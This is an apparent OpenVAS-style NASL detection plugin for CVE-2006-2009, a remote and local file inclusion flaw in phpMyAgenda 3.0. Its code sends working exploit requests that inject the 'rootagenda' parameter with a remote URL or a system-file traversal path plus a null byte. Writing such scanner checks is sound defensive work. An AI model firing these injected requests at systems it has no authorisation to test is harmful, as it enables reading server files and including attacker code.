if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.200002" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2006-2009" );
	script_bugtraq_id( 17670 );
	script_name( "phpMyAgenda version 3.0 File Inclusion Vulnerability" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2008 Ferdy Riphagen" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The remote web server contains a PHP application that is prone to
  remote and local file inclusions attacks.

  Description :

  phpMyAgenda is installed on the remote system. It's an open source
  event management system written in PHP.

  The application does not sanitize the 'rootagenda' parameter in some
  of it's files. This allows an attacker to include arbitrary files from
  remote systems and parse them with privileges of the account under
  which the web server is started.

  This vulnerability exists if PHP's 'register_globals' & 'magic_quotes_gpc'
  are both enabled for the local file inclusions flaw.
  And if 'allow_url_fopen' is also enabled remote file inclusions are also
  possible." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/431862/30/0/threaded" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/phpmyagenda", "/agenda", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: NASLString( dir, "/agenda.php3" ), port: port );
	if(egrep( pattern: "<a href=[^?]+\\?modeagenda=calendar", string: res )){
		files = traversal_files();
		for pattern in keys( files ) {
			file[0] = NASLString( "http://", get_host_name(), dir, "/bugreport.txt" );
			file[1] = "/" + files[pattern];
			req = http_get( item: NASLString( dir, "/infoevent.php3?rootagenda=", file[0], "%00" ), port: port );
			recv = http_keepalive_send_recv( data: req, bodyonly: TRUE, port: port );
			if(recv == NULL){
				continue;
			}
			if( ContainsString( recv, "Bug report for phpMyAgenda" ) ){
				security_message( port: port );
				exit( 0 );
			}
			else {
				req2 = http_get( item: NASLString( dir, "/infoevent.php3?rootagenda=", file[1], "%00" ), port: port );
				recv2 = http_keepalive_send_recv( data: req2, bodyonly: TRUE, port: port );
				if(recv2 == NULL){
					continue;
				}
				if(egrep( pattern: pattern, string: recv2 )){
					security_message( port: port );
					exit( 0 );
				}
			}
		}
	}
}
exit( 99 );

